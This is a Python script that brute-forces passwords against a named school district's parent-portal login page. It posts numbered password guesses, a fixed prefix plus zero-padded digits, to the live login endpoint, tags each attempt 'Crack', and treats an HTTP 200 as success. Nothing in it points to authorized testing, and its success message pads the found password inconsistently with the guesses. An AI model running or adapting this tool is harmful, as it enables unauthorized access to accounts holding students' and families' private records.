import requests,  os, re
from datetime import datetime

############ VARS ############
url = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check'
timeout = 0.5

uName = ''
pWord = '30'
pWordIta = 9999

configFile = 'config.confnose'
DEBUG = True

######### FUNCTIONS #########
def colored(text, color):
    ColorCodes = {'black':'30','red':'31','yellow':'33','green':'32','blue':'34','cyan':'36','magenta':'35','white':'37','gray':'90','reset':'0'}
    return '\033[' + ColorCodes[str(color).lower()] + 'm' + str(text) + "\033[0m"

class config():
    def read(self, file):
        DebugPrint('Config','Parseing Config File', 'cyan')
        data = open(file, 'r').read().split('\n')
        final = {}
        for i in data:
            working = i.split('=')
            try:
                working[0] = working[0].replace(' ','')
                working[1] = re.search(r'"([A-Za-z0-9_\./\\-]*)"', working[1]).group().replace('"','')
            except:
                pass
            if len(working[0]) >= 3 and working[0][0] != '#':
                final[working[0]] = working[1]
        DebugPrint('Config','Config File Parsed Successfully', 'green')
        config.configFileData = final

    def get(self, Thing):
        return config.configFileData[Thing]

def DebugPrint(Catagory,Text,Color):
    if not DEBUG: return
    print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ','yellow')+colored('['+Catagory+'] ','magenta')+colored(Text,Color))

####### MAIN FUNCTION #######
def main():
    DebugPrint('Main', 'Starting...', 'green')
    #config.read(configFile)
    #url = config.get('url')
    DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
    for i in range(314, pWordIta):
        toTry = pWord + (str(i).zfill(len(str(pWordIta))))
        DebugPrint("Crack", f'{colored("Trying", "cyan")} {colored(toTry, "green")}', "cyan")
        try:
            ses = requests.Session()
            ses.max_redirects = 2
            data = ses.post(url, timeout=timeout, data={"j_password": toTry, "j_username": uName})
        except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
            continue
        if data.status_code != 200: continue
        DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"{pWord}{str(i).zfill(2)}", "green")}', "cyan")
        exit(0)
    
if __name__ == "__main__":
    try:
        main()
    except:
        DebugPrint('Main', 'Exiting...', 'red')